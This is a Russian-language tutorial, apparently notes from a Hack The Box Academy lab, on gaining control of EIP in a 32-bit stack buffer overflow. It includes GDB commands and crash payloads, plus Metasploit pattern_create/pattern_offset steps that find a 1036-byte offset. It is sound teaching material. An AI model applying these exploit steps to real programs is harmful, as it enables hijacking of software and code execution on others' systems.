# Take Control of EIP

---

Одним из наиболее важных аспектов переполнения буфера на основе стека является получение `instruction pointer` ( `EIP`) под контролем, поэтому мы можем указать ему, по какому адресу ему следует перейти. Это сделает `EIP` укажите адрес, где находится наш `shellcode` запускается и заставляет процессор выполнить его.

Мы можем выполнять команды в GDB, используя Python, который служит нам непосредственно входными данными.

#### Segmentation Fault

Возьмите под свой контроль EIP

```shell-session
student@nix-bow:~$ gdb -q bow32

(gdb) run $(python -c "print '\x55' * 1200")
Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1200")

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

Если мы вставим 1200" `U`"s (шестнадцатеричный" `55`") в качестве входных данных мы видим из информации регистра, что мы перезаписали `EIP`. Насколько нам известно, `EIP` указывает на следующую команду, которая будет выполнена.

Возьмите под свой контроль EIP

```shell-session
(gdb) info registers 

eax            0x1	1
ecx            0xffffd6c0	-10560
edx            0xffffd06f	-12177
ebx            0x55555555	1431655765
esp            0xffffcfd0	0xffffcfd0
ebp            0x55555555	0x55555555		# <---- EBP overwritten
esi            0xf7fb5000	-134524928
edi            0x0	0
eip            0x55555555	0x55555555		# <---- EIP overwritten
eflags         0x10286	[ PF SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```

Если мы хотим представить процесс визуально, то процесс выглядит примерно так.

#### Buffer

![[Pasted image 20240806050859.png]]

Это означает, что нам нужно записать доступ к EIP. Это, в свою очередь, позволяет указать, на какой адрес памяти должен перейти EIP. Однако для манипулирования регистром нам нужно точное количество U до EIP, чтобы следующие 4 байта можно было перезаписать желаемым адресом памяти.

---

## Determine The Offset

Смещение используется для определения того, сколько байт необходимо для перезаписи буфера и сколько места у нас есть вокруг нашего шеллкода.

Шеллкод — это программный код, содержащий инструкции для операции, которую мы хотим, чтобы процессор выполнил. Ручное создание шеллкода будет более подробно рассмотрено в других модулях. Но чтобы сначала сэкономить время, мы используем Metasploit Framework (MSF), который предлагает скрипт Ruby под названием «pattern_create», который может помочь нам определить точное количество байтов для достижения EIP. Он создает уникальную строку на основе указанной вами длины байтов, чтобы помочь определить смещение.

#### Create Pattern

Возьмите под свой контроль EIP

```shell-session
Uliam@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
Uliam@htb[/htb]$ cat pattern.txt

Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9
```

Теперь заменяем наш 1200" `U`"с сгенерированными шаблонами и снова сосредоточим внимание на EIP.

#### GDB - Using Generated Pattern

Возьмите под свой контроль EIP

```shell-session
(gdb) run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'") 

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'")
Program received signal SIGSEGV, Segmentation fault.
0x69423569 in ?? ()
```

#### GDB - EIP

Возьмите под свой контроль EIP

```shell-session
(gdb) info registers eip

eip            0x69423569	0x69423569
```

Мы видим, что `EIP` отображает другой адрес памяти, и мы можем использовать другой инструмент MSF под названием « `pattern_offset`", чтобы вычислить точное количество символов (смещение), необходимое для перехода к `EIP`.

#### GDB - Offset

Возьмите под свой контроль EIP

```shell-session
Uliam@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569

[*] Exact match at offset 1036
```

#### Buffer

![[Pasted image 20240806050946.png]]

Если мы теперь будем использовать именно это количество байтов для нашего " `U`"s, мы должны приземлиться точно на `EIP`. Чтобы перезаписать его и проверить, достигли ли мы его, как планировалось, мы можем добавить еще 4 байта с помощью " `\x66`" и выполнить его, чтобы гарантировать, что мы контролируем `EIP`.

#### GDB Offset

Возьмите под свой контроль EIP

```shell-session
(gdb) run $(python -c "print '\x55' * 1036 + '\x66' * 4")

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1036 + '\x66' * 4")
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```

#### Buffer

![изображение](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_4.png)

Теперь мы видим, что мы перезаписали `EIP` с нашим " `\x66`" символов. Далее нам нужно выяснить, сколько места у нас есть для нашего шеллкода, который затем выполняет нужные нам команды. Поскольку мы контролируем `EIP` теперь мы позже перезапишем его адресом, указывающим на начало нашего шеллкода.